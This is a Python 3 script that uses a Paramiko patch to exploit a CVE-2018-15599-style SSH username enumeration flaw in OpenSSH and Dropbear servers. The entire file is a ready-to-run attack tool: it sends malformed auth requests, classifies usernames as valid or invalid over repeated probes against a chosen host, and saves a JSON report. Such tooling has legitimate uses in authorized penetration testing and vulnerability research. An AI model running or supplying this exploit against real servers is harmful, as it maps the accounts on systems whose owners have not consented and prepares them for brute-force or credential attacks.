#!/usr/bin/env python3
"""Probe CVE-2018-15599-style SSH username enumeration.

This is a Python 3/Paramiko 2.x adaptation of the public OpenSSH username
enumeration technique that also applies to Dropbear 2018.76. Results are
probabilistic on embedded targets, so the script repeats probes and records
per-attempt evidence instead of treating a single response as truth.
"""

from __future__ import annotations

import argparse
import json
import logging
import secrets
import socket
import time
from pathlib import Path

import paramiko


class InvalidUsername(Exception):
    pass


OLD_SERVICE_ACCEPT = paramiko.auth_handler.AuthHandler._client_handler_table[
    paramiko.common.MSG_SERVICE_ACCEPT
]
OLD_USERAUTH_FAILURE = paramiko.auth_handler.AuthHandler._client_handler_table[
    paramiko.common.MSG_USERAUTH_FAILURE
]
OLD_ADD_BOOLEAN = paramiko.message.Message.add_boolean


def _skip_boolean(*_args, **_kwargs):
    return None


def _service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = _skip_boolean
    try:
        return OLD_SERVICE_ACCEPT(*args, **kwargs)
    finally:
        paramiko.message.Message.add_boolean = OLD_ADD_BOOLEAN


def _userauth_failure(*_args, **_kwargs):
    raise InvalidUsername()


def install_paramiko_patch() -> None:
    paramiko.auth_handler.AuthHandler._client_handler_table.update(
        {
            paramiko.common.MSG_SERVICE_ACCEPT: _service_accept,
            paramiko.common.MSG_USERAUTH_FAILURE: _userauth_failure,
        }
    )
    logging.getLogger("paramiko.transport").addHandler(logging.NullHandler())


def probe_once(
    host: str,
    port: int,
    username: str,
    timeout: float,
    kex_algorithms: list[str] | None,
    key_types: list[str] | None,
) -> dict:
    sock = None
    transport = None
    started = time.monotonic()
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        transport = paramiko.transport.Transport(sock)
        security_options = transport.get_security_options()
        if kex_algorithms:
            security_options.kex = tuple(kex_algorithms)
        if key_types:
            security_options.key_types = tuple(key_types)
        transport.start_client(timeout=timeout)
        key = paramiko.RSAKey.generate(1024)
        transport.auth_publickey(username, key)
        result = "unexpected_success"
    except InvalidUsername:
        result = "invalid"
    except paramiko.ssh_exception.AuthenticationException:
        result = "valid"
    except Exception as exc:  # embedded Dropbear sometimes drops connections
        result = "error"
        return {
            "username": username,
            "result": result,
            "error_type": type(exc).__name__,
            "error": str(exc)[:200],
            "elapsed_ms": round((time.monotonic() - started) * 1000),
        }
    finally:
        if transport is not None:
            transport.close()
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
    return {
        "username": username,
        "result": result,
        "elapsed_ms": round((time.monotonic() - started) * 1000),
    }


def classify(attempts: list[dict]) -> dict:
    counts: dict[str, int] = {}
    for attempt in attempts:
        counts[attempt["result"]] = counts.get(attempt["result"], 0) + 1
    valid = counts.get("valid", 0)
    invalid = counts.get("invalid", 0)
    errors = counts.get("error", 0)
    if valid > invalid and valid >= 2:
        verdict = "likely_valid"
    elif invalid > valid and invalid >= 2:
        verdict = "likely_invalid"
    elif valid == 1 and invalid == 0 and errors == 0:
        verdict = "possibly_valid"
    elif invalid == 1 and valid == 0 and errors == 0:
        verdict = "possibly_invalid"
    else:
        verdict = "inconclusive"
    return {"counts": counts, "verdict": verdict}


def load_users(args: argparse.Namespace) -> list[str]:
    users: list[str] = []
    if args.user:
        users.extend(args.user)
    if args.user_file:
        users.extend(
            line.strip()
            for line in args.user_file.read_text(encoding="utf-8").splitlines()
            if line.strip() and not line.lstrip().startswith("#")
        )
    seen = set()
    ordered = []
    for user in users:
        if user not in seen:
            seen.add(user)
            ordered.append(user)
    return ordered


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("--port", type=int, default=22)
    parser.add_argument("--user", action="append")
    parser.add_argument("--user-file", type=Path)
    parser.add_argument("--repeats", type=int, default=3)
    parser.add_argument("--timeout", type=float, default=8.0)
    parser.add_argument("--delay", type=float, default=0.2)
    parser.add_argument(
        "--kex",
        action="append",
        help="Restrict Paramiko to this key exchange algorithm; can be repeated.",
    )
    parser.add_argument(
        "--key-type",
        action="append",
        help="Restrict Paramiko to this server host-key algorithm; can be repeated.",
    )
    parser.add_argument("--out", type=Path, required=True)
    args = parser.parse_args()

    users = load_users(args)
    control = f"codex_invalid_{secrets.token_hex(6)}"
    users.append(control)
    install_paramiko_patch()

    report = {
        "host": args.host,
        "port": args.port,
        "repeats": args.repeats,
        "control_invalid_user": control,
        "started_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "results": {},
    }

    for user in users:
        attempts = []
        for _idx in range(args.repeats):
            attempts.append(
                probe_once(args.host, args.port, user, args.timeout, args.kex, args.key_type)
            )
            time.sleep(args.delay)
        summary = classify(attempts)
        summary["attempts"] = attempts
        report["results"][user] = summary

    report["finished_utc"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    args.out.parent.mkdir(parents=True, exist_ok=True)
    args.out.write_text(json.dumps(report, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
